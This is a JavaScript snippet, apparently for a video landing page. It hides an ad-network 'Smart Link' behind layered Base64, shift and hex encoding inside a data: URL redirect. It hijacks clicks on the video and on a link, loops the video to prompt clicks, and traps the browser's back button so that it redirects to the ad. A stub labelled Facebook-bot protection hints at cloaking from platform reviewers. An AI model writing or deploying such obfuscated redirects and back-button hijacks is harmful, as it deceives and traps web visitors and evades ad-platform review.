    <script>
        // Configuración con tu Smart Link
        const config = {
            smartLink: "https://www.profitableratecpm.com/f9i33hr9d2?key=03d7472f6eb5ea24b3277a1c3a50bf56",
            rewindSeconds: 6
        };

        // Función de encriptación mejorada
        function encryptUrl(url) {
            // Primera capa: Codificación Base64 con prefijo aleatorio
            let prefix = Math.random().toString(36).substring(2, 6);
            let encoded = btoa(prefix + encodeURIComponent(url));
            
            // Segunda capa: Inversión + Desplazamiento variable
            encoded = encoded.split('').reverse().map((c, i) => 
                String.fromCharCode(c.charCodeAt(0) + 3 + (i % 3))).join('');
            
            // Tercera capa: Codificación hexadecimal con separadores
            encoded = encoded.split('').map((c, i) => 
                (i % 4 === 0 ? '-' : '') + c.charCodeAt(0).toString(16)).join('');
            
            // Página intermedia de redirección
            return `data:text/html;charset=utf-8,${encodeURIComponent(`
                <!DOCTYPE html>
                <html>
                <head>
                    <title>Redireccionando...</title>
                    <script>
                        function decrypt(encoded) {
                            // Eliminar separadores
                            encoded = encoded.replace(/-/g, '');
                            
                            // Convertir hexadecimal a string
                            let decoded = '';
                            for(let i = 0; i < encoded.length; i += 2) {
                                decoded += String.fromCharCode(
                                    parseInt(encoded.substr(i, 2), 16));
                            }
                            
                            // Revertir desplazamiento variable
                            decoded = decoded.split('').map((c, i) => 
                                String.fromCharCode(c.charCodeAt(0) - 3 - (i % 3))).join('');
                                
                            // Revertir inversión y Base64
                            decoded = decoded.split('').reverse().join('');
                            decoded = atob(decoded).substring(4); // Eliminar prefijo aleatorio
                            
                            return decodeURIComponent(decoded);
                        }
                        
                        // Obtener parámetro encriptado
                        const urlParams = new URLSearchParams(window.location.search);
                        const encrypted = urlParams.get('u') || "${encoded.replace(/"/g, '\\"')}";
                        
                        // Redirigir
                        if(encrypted) {
                            window.location.href = decrypt(encrypted);
                        }
                    <\/script>
                    <meta http-equiv="refresh" content="0;url=about:blank">
                </head>
                <body></body>
                </html>
            `)}?u=${encoded}`;
        }

        // Encriptar el Smart Link
        const encryptedLink = encryptUrl(config.smartLink);

        // Configurar redirecciones
        document.getElementById('redirectLink').addEventListener('click', function(e) {
            e.preventDefault();
            window.location.href = encryptedLink;
        });

        document.getElementById('myVideo').addEventListener('click', function() {
            window.location.href = encryptedLink;
        });

        // Control del video
        const video = document.getElementById('myVideo');
        const videoOverlay = document.getElementById('videoOverlay');

        videoOverlay.addEventListener('click', function() {
            videoOverlay.style.display = 'none';
            video.play();
        });

        video.addEventListener('timeupdate', function() {
            if (this.currentTime > this.duration - 1) {
                this.currentTime = Math.max(0, this.duration - config.rewindSeconds);
                this.pause();
                videoOverlay.style.display = 'flex';
            }
        });

        // Protección contra bots de Facebook
        if (/facebook|FB_IAB|FBAN|FBAV/i.test(navigator.userAgent)) {

        }

        history.pushState(null, null, location.href);
        window.addEventListener('popstate', function() {
            history.pushState(null, null, location.href);
            window.location.href = encryptedLink;
        });
